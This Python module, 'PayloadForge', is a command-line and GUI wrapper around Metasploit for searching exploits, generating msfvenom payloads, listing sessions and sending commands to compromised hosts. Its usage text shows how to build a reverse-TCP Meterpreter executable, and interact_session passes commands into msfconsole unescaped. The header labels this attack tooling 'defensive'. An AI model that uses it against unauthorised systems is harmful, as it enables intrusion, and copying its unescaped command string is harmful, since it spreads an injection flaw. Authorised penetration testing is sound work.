"""
PayloadForge - Beautiful GUI for Metasploit Framework
=====================================================

A production-ready web interface for Metasploit with intuitive navigation,
exploit browsing, payload generation, session management, and post-exploitation.

Features:
- Exploit browser with search and filtering
- Payload generator (msfvenom wrapper)
- Session management dashboard
- Post-exploitation automation
- Listener/handler management
- Database workspace management
- Beautiful reactive HTML/JavaScript GUI

Copyright (c) 2025 Joshua Hendricks Cole (DBA: Corporation of Light). All Rights Reserved. PATENT PENDING.

Classification: Defensive Security Tool
License: Proprietary - Ai|oS Security Suite
"""

import asyncio
import json
import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set
import tempfile

# Check for Metasploit installation
MSF_CONSOLE = shutil.which("msfconsole")
MSF_VENOM = shutil.which("msfvenom")


@dataclass
class Exploit:
    """Represents a Metasploit exploit."""
    name: str
    fullname: str
    rank: str = "unknown"
    description: str = ""
    platform: str = ""
    arch: str = ""
    targets: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)


@dataclass
class Payload:
    """Represents a generated payload."""
    name: str
    platform: str
    arch: str
    encoder: str = ""
    iterations: int = 1
    format: str = "raw"
    output_path: str = ""
    size_bytes: int = 0


@dataclass
class Session:
    """Represents an active Meterpreter/shell session."""
    session_id: int
    session_type: str
    target_host: str
    target_port: int
    user: str = ""
    os: str = ""
    opened_at: str = ""


class PayloadForge:
    """
    PayloadForge - Beautiful GUI wrapper for Metasploit Framework.

    Provides intuitive web interface for exploit browsing, payload generation,
    session management, and post-exploitation.
    """

    def __init__(self):
        """Initialize PayloadForge."""
        self.msf_console = MSF_CONSOLE
        self.msf_venom = MSF_VENOM
        self.exploits_cache: Optional[List[Exploit]] = None
        self.sessions: Dict[int, Session] = {}

    def health_check(self) -> Dict:
        """Check if Metasploit is installed and functional."""
        if not self.msf_console or not self.msf_venom:
            return {
                "tool": "PayloadForge",
                "status": "error",
                "summary": "Metasploit Framework not found",
                "details": {
                    "msfconsole_available": self.msf_console is not None,
                    "msfvenom_available": self.msf_venom is not None,
                    "install_hint": "Install Metasploit: https://www.metasploit.com/"
                }
            }

        # Test msfconsole
        try:
            proc = subprocess.run(
                [self.msf_console, "-v"],
                capture_output=True,
                text=True,
                timeout=10
            )
            version_match = re.search(r'(\d+\.\d+\.\d+)', proc.stdout)
            version = version_match.group(1) if version_match else "unknown"

            return {
                "tool": "PayloadForge",
                "status": "ok",
                "summary": f"PayloadForge ready with Metasploit {version}",
                "details": {
                    "msf_version": version,
                    "msfconsole_path": self.msf_console,
                    "msfvenom_path": self.msf_venom,
                    "features": [
                        "Exploit browser",
                        "Payload generator",
                        "Session manager",
                        "Post-exploitation",
                        "Listener management"
                    ]
                },
                "activation_email": "joshua@thegavl.com"
            }
        except Exception as e:
            return {
                "tool": "PayloadForge",
                "status": "warn",
                "summary": f"Metasploit found but execution failed: {e}",
                "details": {"error": str(e)}
            }

    def list_exploits(self, search: str = "", platform: str = "") -> List[Exploit]:
        """
        List available exploits with optional filtering.

        Args:
            search: Search term for exploit names
            platform: Filter by platform (windows, linux, osx, etc.)

        Returns:
            List of Exploit objects
        """
        if not self.msf_console:
            return []

        # Build msfconsole command
        cmd = f"search {search}"
        if platform:
            cmd += f" platform:{platform}"

        try:
            proc = subprocess.run(
                [self.msf_console, "-q", "-x", f"{cmd};exit"],
                capture_output=True,
                text=True,
                timeout=30
            )

            exploits = []
            for line in proc.stdout.split('\n'):
                # Parse exploit listing
                match = re.match(r'\s+(\d+)\s+(\S+)\s+(\d{4}-\d{2}-\d{2})\s+(\w+)\s+(.*)', line)
                if match:
                    idx, fullname, date, rank, description = match.groups()

                    # Extract platform/arch from path
                    parts = fullname.split('/')
                    platform_guess = parts[1] if len(parts) > 1 else ""

                    exploits.append(Exploit(
                        name=fullname.split('/')[-1],
                        fullname=fullname,
                        rank=rank,
                        description=description.strip(),
                        platform=platform_guess
                    ))

            self.exploits_cache = exploits
            return exploits

        except Exception as e:
            print(f"[error] Failed to list exploits: {e}")
            return []

    def generate_payload(
        self,
        payload_name: str,
        lhost: str,
        lport: int,
        format: str = "exe",
        encoder: str = "",
        iterations: int = 1,
        output_path: str = ""
    ) -> Optional[Payload]:
        """
        Generate payload using msfvenom.

        Args:
            payload_name: Payload type (e.g., windows/meterpreter/reverse_tcp)
            lhost: Listener host (LHOST)
            lport: Listener port (LPORT)
            format: Output format (exe, elf, raw, python, etc.)
            encoder: Encoder to use (optional)
            iterations: Encoding iterations
            output_path: Where to save payload

        Returns:
            Payload object with generation details
        """
        if not self.msf_venom:
            return None

        # Build msfvenom command
        cmd = [
            self.msf_venom,
            "-p", payload_name,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", format
        ]

        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        if not output_path:
            output_path = f"/tmp/payload_{int(time.time())}.{format}"

        cmd.extend(["-o", output_path])

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if proc.returncode == 0 and Path(output_path).exists():
                size = Path(output_path).stat().st_size

                # Extract platform/arch
                parts = payload_name.split('/')
                platform = parts[0] if len(parts) > 0 else "unknown"

                return Payload(
                    name=payload_name,
                    platform=platform,
                    arch="x86" if "x86" in payload_name else "x64",
                    encoder=encoder,
                    iterations=iterations,
                    format=format,
                    output_path=output_path,
                    size_bytes=size
                )
            else:
                print(f"[error] msfvenom failed: {proc.stderr}")
                return None

        except Exception as e:
            print(f"[error] Payload generation failed: {e}")
            return None

    def list_sessions(self) -> List[Session]:
        """
        List active Meterpreter/shell sessions.

        Returns:
            List of active Session objects
        """
        if not self.msf_console:
            return []

        try:
            proc = subprocess.run(
                [self.msf_console, "-q", "-x", "sessions -l;exit"],
                capture_output=True,
                text=True,
                timeout=15
            )

            sessions = []
            for line in proc.stdout.split('\n'):
                # Parse session listing
                match = re.match(r'\s+(\d+)\s+(\S+)\s+(\S+)\s+(\S+):(\d+)\s+->\s+(\S+):(\d+)\s+\((.*?)\)', line)
                if match:
                    sid, stype, via, lhost, lport, rhost, rport, opened = match.groups()

                    sessions.append(Session(
                        session_id=int(sid),
                        session_type=stype,
                        target_host=rhost,
                        target_port=int(rport),
                        opened_at=opened
                    ))

            return sessions

        except Exception as e:
            print(f"[error] Failed to list sessions: {e}")
            return []

    def interact_session(self, session_id: int, command: str) -> str:
        """
        Send command to specific session.

        Args:
            session_id: Session ID to interact with
            command: Command to execute

        Returns:
            Command output
        """
        if not self.msf_console:
            return ""

        try:
            msf_cmd = f"sessions -i {session_id} -C '{command}'"

            proc = subprocess.run(
                [self.msf_console, "-q", "-x", f"{msf_cmd};exit"],
                capture_output=True,
                text=True,
                timeout=30
            )

            return proc.stdout.strip()

        except Exception as e:
            return f"[error] Failed to execute command: {e}"

    def launch_gui(self):
        """Launch HTML/JavaScript GUI in default browser."""
        import webbrowser

        # GUI HTML is in separate file
        gui_path = Path(__file__).parent / "payloadforge_gui.html"

        if not gui_path.exists():
            print("[error] PayloadForge GUI file not found")
            return

        webbrowser.open(f"file://{gui_path}")
        print(f"[info] PayloadForge GUI launched: {gui_path}")


def health_check() -> Dict:
    """Health check entrypoint for tool registry."""
    forge = PayloadForge()
    return forge.health_check()


def main(argv=None):
    """CLI entrypoint for PayloadForge."""
    import argparse

    parser = argparse.ArgumentParser(
        description="PayloadForge - Beautiful GUI for Metasploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # List exploits
  python -m tools.payloadforge list-exploits --search windows --platform windows

  # Generate payload
  python -m tools.payloadforge generate-payload \\
    --payload windows/meterpreter/reverse_tcp \\
    --lhost 192.168.1.10 \\
    --lport 4444 \\
    --format exe \\
    --output payload.exe

  # List active sessions
  python -m tools.payloadforge list-sessions

  # Launch GUI
  python -m tools.payloadforge --gui

  # Health check
  python -m tools.payloadforge --health
        """
    )

    parser.add_argument("--gui", action="store_true", help="Launch GUI")
    parser.add_argument("--health", action="store_true", help="Run health check")
    parser.add_argument("--json", action="store_true", help="Output as JSON")

    subparsers = parser.add_subparsers(dest="command", help="Command to run")

    # list-exploits
    list_parser = subparsers.add_parser("list-exploits", help="List available exploits")
    list_parser.add_argument("--search", default="", help="Search term")
    list_parser.add_argument("--platform", default="", help="Platform filter")

    # generate-payload
    gen_parser = subparsers.add_parser("generate-payload", help="Generate payload")
    gen_parser.add_argument("--payload", required=True, help="Payload name")
    gen_parser.add_argument("--lhost", required=True, help="Listener host")
    gen_parser.add_argument("--lport", type=int, required=True, help="Listener port")
    gen_parser.add_argument("--format", default="exe", help="Output format")
    gen_parser.add_argument("--encoder", default="", help="Encoder")
    gen_parser.add_argument("--iterations", type=int, default=1, help="Encoding iterations")
    gen_parser.add_argument("--output", default="", help="Output path")

    # list-sessions
    subparsers.add_parser("list-sessions", help="List active sessions")

    args = parser.parse_args(argv)

    forge = PayloadForge()

    # Health check
    if args.health:
        health = forge.health_check()
        if args.json:
            print(json.dumps(health, indent=2))
        else:
            print(f"[{health['status']}] {health['summary']}")
            if health.get('details'):
                for key, value in health['details'].items():
                    print(f"  {key}: {value}")
        return 0 if health['status'] == 'ok' else 1

    # GUI mode
    if args.gui:
        forge.launch_gui()
        return 0

    # Commands
    if args.command == "list-exploits":
        exploits = forge.list_exploits(args.search, args.platform)

        if args.json:
            output = [
                {
                    "name": e.name,
                    "fullname": e.fullname,
                    "rank": e.rank,
                    "description": e.description,
                    "platform": e.platform
                }
                for e in exploits
            ]
            print(json.dumps(output, indent=2))
        else:
            print(f"\nFound {len(exploits)} exploits:\n")
            for e in exploits:
                print(f"  [{e.rank}] {e.fullname}")
                print(f"      {e.description}")
                print()

        return 0

    elif args.command == "generate-payload":
        payload = forge.generate_payload(
            payload_name=args.payload,
            lhost=args.lhost,
            lport=args.lport,
            format=args.format,
            encoder=args.encoder,
            iterations=args.iterations,
            output_path=args.output
        )

        if payload:
            if args.json:
                print(json.dumps({
                    "name": payload.name,
                    "platform": payload.platform,
                    "arch": payload.arch,
                    "format": payload.format,
                    "output_path": payload.output_path,
                    "size_bytes": payload.size_bytes
                }, indent=2))
            else:
                print(f"[info] Payload generated successfully!")
                print(f"  Path: {payload.output_path}")
                print(f"  Size: {payload.size_bytes} bytes")
                print(f"  Format: {payload.format}")
            return 0
        else:
            print("[error] Payload generation failed")
            return 1

    elif args.command == "list-sessions":
        sessions = forge.list_sessions()

        if args.json:
            output = [
                {
                    "session_id": s.session_id,
                    "type": s.session_type,
                    "target": f"{s.target_host}:{s.target_port}",
                    "opened_at": s.opened_at
                }
                for s in sessions
            ]
            print(json.dumps(output, indent=2))
        else:
            print(f"\nActive Sessions ({len(sessions)}):\n")
            for s in sessions:
                print(f"  Session {s.session_id}: {s.session_type}")
                print(f"    Target: {s.target_host}:{s.target_port}")
                print(f"    Opened: {s.opened_at}")
                print()

        return 0

    else:
        parser.print_help()
        return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
